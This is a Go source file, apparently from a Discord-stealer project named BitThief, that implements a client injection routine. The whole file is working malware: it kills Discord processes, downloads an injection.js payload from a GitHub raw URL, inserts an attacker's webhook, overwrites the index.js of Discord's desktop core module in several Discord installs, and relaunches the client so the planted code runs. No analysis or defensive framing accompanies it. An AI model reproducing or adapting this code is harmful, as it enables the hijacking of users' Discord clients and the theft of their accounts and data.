package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/shirou/gopsutil/v3/process"
)

func killDiscordProcesses() {
	procs, err := process.Processes()
	if err != nil {
		return
	}

	for _, proc := range procs {
		name, err := proc.Name()
		if err != nil {
			continue
		}

		if strings.Contains(strings.ToLower(name), "discord") {
			_ = proc.Kill()
		}
	}
}

func InjectDiscord(webhook string) error {
	localAppData := os.Getenv("LOCALAPPDATA")
	if localAppData == "" {
		return fmt.Errorf("LOCALAPPDATA environment variable not set")
	}
	discordDirs := []string{
		filepath.Join(localAppData, "Discord"),
		filepath.Join(localAppData, "DiscordCanary"),
		filepath.Join(localAppData, "DiscordPTB"),
		filepath.Join(localAppData, "DiscordDevelopment"),
	}

	url := "https://raw.githubusercontent.com/greenstorm5417/BitThief/refs/heads/main/injection/injection.js"
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("failed to download injection code: %w", err)
	}
	defer resp.Body.Close()

	codeBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read injection code: %w", err)
	}
	code := string(codeBytes)

	killDiscordProcesses()

	for _, dir := range discordDirs {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			continue
		}

		corePath, version, err := getCore(dir)
		if err != nil || corePath == "" {
			continue
		}

		modifiedCode := strings.ReplaceAll(code, "discord_desktop_core-1", version)
		modifiedCode = strings.ReplaceAll(modifiedCode, "%WEBHOOK%", webhook)

		indexPath := filepath.Join(corePath, "index.js")
		if err := os.WriteFile(indexPath, []byte(modifiedCode), 0644); err != nil {
			continue
		}

		if err := startDiscord(dir); err != nil {
			continue
		}
	}

	return nil
}

func getCore(dir string) (string, string, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return "", "", err
	}

	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "app-") {
			appDir := filepath.Join(dir, entry.Name())
			modulesDir := filepath.Join(appDir, "modules")
			if _, err := os.Stat(modulesDir); err != nil {
				continue
			}

			modEntries, err := os.ReadDir(modulesDir)
			if err != nil {
				continue
			}

			re := regexp.MustCompile("^discord_desktop_core")
			for _, modEntry := range modEntries {
				if !re.MatchString(modEntry.Name()) {
					continue
				}

				corePath := filepath.Join(modulesDir, modEntry.Name(), "discord_desktop_core")
				indexPath := filepath.Join(corePath, "index.js")
				if _, err := os.Stat(indexPath); err != nil {
					continue
				}

				return corePath, modEntry.Name(), nil
			}
		}
	}

	return "", "", nil
}

func startDiscord(dir string) error {
	updatePath := filepath.Join(dir, "Update.exe")
	exeName := filepath.Base(dir) + ".exe"

	entries, err := os.ReadDir(dir)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		if entry.IsDir() && strings.HasPrefix(entry.Name(), "app-") {
			appDir := filepath.Join(dir, entry.Name())
			modulesPath := filepath.Join(appDir, "modules")
			if _, err := os.Stat(modulesPath); err != nil {
				continue
			}

			appEntries, err := os.ReadDir(appDir)
			if err != nil {
				continue
			}

			for _, appEntry := range appEntries {
				if !appEntry.IsDir() && appEntry.Name() == exeName {
					executable := filepath.Join(appDir, exeName)
					cmd := exec.Command(updatePath, "--processStart", executable)
					return cmd.Run()
				}
			}
		}
	}

	return nil
}
